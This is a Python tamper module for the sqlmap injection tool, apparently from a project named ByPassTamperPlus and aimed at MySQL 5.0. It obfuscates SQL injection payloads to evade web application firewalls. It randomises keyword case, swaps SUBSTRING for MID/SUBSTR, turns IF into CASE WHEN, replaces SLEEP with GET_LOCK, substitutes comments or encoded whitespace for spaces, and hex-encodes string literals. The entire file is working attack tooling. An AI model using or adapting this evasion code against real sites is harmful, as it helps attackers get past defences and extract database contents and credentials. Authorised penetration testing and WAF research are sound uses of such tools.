#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mysql50_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):

    if not payload:
        return payload

    def random_case(word):
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)

    def general_obfuscate(p):

        keywords = [
            "SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "GROUP_CONCAT",
            "INFORMATION_SCHEMA", "TABLES", "COLUMNS", "TABLE_NAME", "COLUMN_NAME",
            "USER", "CURRENT_USER", "FILE_PRIV", "DATABASE", "AS", "LIMIT", "OFFSET",
            "CASE", "WHEN", "THEN", "ELSE", "END", "IFNULL", "GET_LOCK", "RELEASE_LOCK"
        ]
        for kw in keywords:
            p = re.sub(r"(?i)\b%s\b" % kw, lambda m: random_case(m.group(0)), p)

        p = re.sub(r"(?i)SUBSTRING\(", lambda m: random_case(random.choice(["MID(", "SUBSTR("])), p)

        def if_to_case(match):
            cond, a, b = match.group(1), match.group(2), match.group(3)
            return random_case("CASE WHEN ") + cond + random_case(" THEN ") + a + random_case(" ELSE ") + b + random_case(" END")
        p = re.sub(r"(?i)IF\(([^,]+),([^,]+),([^,]+)\)", if_to_case, p)

        spaces = ["/**/", "%0a", "%09", "%0b", "%0c"]
        p = re.sub(r" ", lambda m: random.choice(spaces), p)

        p = re.sub(r"'([^']*)'", lambda m: "0x" + m.group(1).encode("utf-8").hex(), p)

        return p

    payload = re.sub(r"(?i)SLEEP\((\d+)\)", r"GET_LOCK(UUID(),\1)", payload)

    payload = re.sub(r"(?i)DATABASE\(\)", "@@database", payload)

    payload = re.sub(r"(?i)USER\(\)", "CURRENT_USER()", payload)

    payload = general_obfuscate(payload)

    return payload
